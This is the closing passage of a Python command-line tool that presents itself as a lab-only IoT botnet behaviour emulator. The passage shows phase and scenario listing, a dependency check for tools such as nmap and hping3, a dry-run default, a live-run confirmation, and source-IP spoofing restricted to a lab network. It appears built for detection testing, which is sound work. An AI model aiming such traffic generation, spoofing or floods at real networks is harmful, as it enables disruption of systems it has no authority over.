        print(f"    run_{RUN_ID}_{suffix}")


# =============================================================================
# CLI
# =============================================================================
def cmd_describe():
    print(f"{C.BOLD}IoT botnet behaviour emulator - phase catalogue{C.END}\n")
    for k, fn in PHASES.items():
        doc = fn.__doc__.strip().split("\n")[0]
        print(f"  {C.G}{k:<13}{C.END} {doc}")
    print(f"\n{C.BOLD}Scenarios{C.END}")
    for k, v in SCENARIOS.items():
        print(f"  {C.G}{k:<16}{C.END} {' -> '.join(v)}")
    print(f"\n{C.DIM}All phases are inert emulation: no real malware, no login "
          f"escalation, no remote execution, no unbounded flood. Dry-run by "
          f"default; add --fire to execute.{C.END}")


def cmd_deps():
    print("Tool availability (install on the attacker box as needed):")
    for t, pkg in [("nmap", "nmap"), ("curl", "curl"), ("dig", "dnsutils"),
                   ("mosquitto_pub", "mosquitto-clients"), ("hping3", "hping3")]:
        print(f"  {C.G}OK{C.END} {t:<15}" if have(t) else f"  {C.R}--{C.END} {t:<15}", f"({pkg})")
    for m, pip in [(SCAPY, "scapy"), (MQTT, "paho-mqtt"), (DNS_RES, "dnspython")]:
        name = pip
        print(f"  {C.G}OK{C.END} py:{name:<12}" if m else f"  {C.R}--{C.END} py:{name:<12}",
              f"(pip install {pip})")


def run(name: str):
    if name in SCENARIOS:
        order = SCENARIOS[name]
        print(f"{C.BOLD}Scenario {name}: {' -> '.join(order)}{C.END}")
    elif name in PHASES:
        order = [name]
    else:
        die(f"unknown phase/scenario '{name}' (try: {sys.argv[0]} describe)")
    for i, ph in enumerate(order):
        if _STOP:
            break
        baseline(f"before:{ph}")
        PHASES[ph]()
        baseline(f"after:{ph}")
        if FIRE and i < len(order) - 1:
            _sleep(random.uniform(*PHASE_SPACING))


def main():
    global FIRE, RUN_SEED, OUT_DIR, SPOOF_SRC
    ap = argparse.ArgumentParser(description="IoT botnet behaviour emulator (lab-only).")
    sub = ap.add_subparsers(dest="cmd")
    sub.add_parser("describe")
    sub.add_parser("deps")
    rp = sub.add_parser("run")
    rp.add_argument("name", help="a phase or scenario (see `describe`)")
    rp.add_argument("--fire", action="store_true", help="execute (default: dry-run)")
    rp.add_argument("--seed", type=int, default=RUN_SEED)
    rp.add_argument("--out", default=OUT_DIR, help="output directory")
    rp.add_argument("--spoof-src", default=None, help="source IP to spoof (must be in LAB_NET)")
    rp.add_argument("--yes", action="store_true", help="skip the live confirmation prompt")
    a = ap.parse_args()

    if a.cmd == "describe":
        return cmd_describe()
    if a.cmd == "deps":
        return cmd_deps()
    if a.cmd != "run":
        return ap.print_help()

    FIRE = a.fire
    RUN_SEED = a.seed
    OUT_DIR = a.out
    SPOOF_SRC = a.spoof_src or SPOOF_SRC
    random.seed(RUN_SEED)
    if SPOOF_SRC:
        assert_lab(SPOOF_SRC)

    print(f"{C.BOLD}IoT botnet behaviour emulator{C.END}  run={RUN_ID}  lab={LAB_NET}")
    print(f"{C.Y}{'LIVE - traffic WILL be generated' if FIRE else 'DRY-RUN - prints the plan; add --fire to execute'}{C.END}")
    print(f"{C.DIM}inert emulation: no real binary/persistence/replication/exploit; "
          f"bounded floods; seed={RUN_SEED}; src={SPOOF_SRC or ATTACKER_IP}{C.END}")

    if FIRE and not a.yes:
        if input(f"\n{C.BOLD}Run LIVE against {LAB_NET}? [y/N] {C.END}").strip().lower() != "y":
            die("aborted.")

    started = now_iso()
    record("run_start", "meta", "N/A", LAB_NET, started, mono(), {"scenario": a.name})
    run(a.name)
    record("run_end", "meta", "N/A", LAB_NET, now_iso(), mono())
    write_outputs(a.name, started)
    print(f"\n{C.DIM}done.{C.END}")


if __name__ == "__main__":
    main()
